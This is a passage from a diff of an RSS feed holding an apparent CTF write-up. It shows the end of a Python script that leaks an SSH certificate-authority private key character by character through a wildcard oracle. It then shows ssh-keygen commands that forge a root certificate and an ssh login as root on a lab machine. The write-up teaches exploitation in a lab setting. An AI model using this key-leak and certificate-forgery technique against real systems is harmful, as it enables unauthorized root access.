+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stderr&lt;span style="color:#fe8019">=&lt;/span>subprocess&lt;span style="color:#fe8019">.&lt;/span>PIPE,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shell&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">True&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Use API for signing with this CA.&amp;#34;&lt;/span> &lt;span style="color:#fe8019">in&lt;/span> output&lt;span style="color:#fe8019">.&lt;/span>stdout&lt;span style="color:#fe8019">.&lt;/span>decode()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">while&lt;/span> &lt;span style="color:#fe8019">not&lt;/span> leaked_key&lt;span style="color:#fe8019">.&lt;/span>endswith(&lt;span style="color:#b8bb26">&amp;#39;-----END OPENSSH PRIVATE KEY----&amp;#39;&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">for&lt;/span> s &lt;span style="color:#fe8019">in&lt;/span> chars:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">with&lt;/span> &lt;span style="color:#fabd2f">open&lt;/span>(ca, &lt;span style="color:#b8bb26">&amp;#39;w&amp;#39;&lt;/span>) &lt;span style="color:#fe8019">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f&lt;span style="color:#fe8019">.&lt;/span>write(leaked_key &lt;span style="color:#fe8019">+&lt;/span> s &lt;span style="color:#fe8019">+&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;*&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> is_valid_ca():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> leaked_key &lt;span style="color:#fe8019">=&lt;/span> leaked_key &lt;span style="color:#fe8019">+&lt;/span> s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os&lt;span style="color:#fe8019">.&lt;/span>system(&lt;span style="color:#b8bb26">&amp;#39;clear&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">print&lt;/span>(leaked_key)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">print&lt;/span>(leaked_key)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now execute the script, it will take some time to leak the entire file content.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129232152.webp">&lt;/figure>
+&lt;p>Now let&amp;rsquo;s create an ssh key for root and let&amp;rsquo;s sign it using the CA.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf-root
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh-keygen -s ca-root -I root -n root_user ctf-root.pub
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129232949.webp">&lt;/figure>
+&lt;p>Now let&amp;rsquo;s login as root&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh root@10.10.11.27 -p &lt;span style="color:#d3869b">2222&lt;/span> -i ctf-root -o CertificateFile&lt;span style="color:#fe8019">=&lt;/span>ctf-root-cert.pub
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129233357.webp">&lt;/figure>
+&lt;h4 id="reference">Reference:&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.php.net/manual/en/phar.using.stream.php">&lt;code>phar://&lt;/code> wrapper&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://rudrasarkar.medium.com/exploiting-phar-stream-wrapper-d2140592c6e7">Exploiting phar stream wrapper&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://en.wikipedia.org/wiki/HAR_(file_format)">HAR&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.lorier.net/docs/ssh-ca.html">Certification Authority key&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d">SSH at scale CAs and Principals&lt;/a>&lt;/li>
+&lt;/ul></content></item></channel></rss>
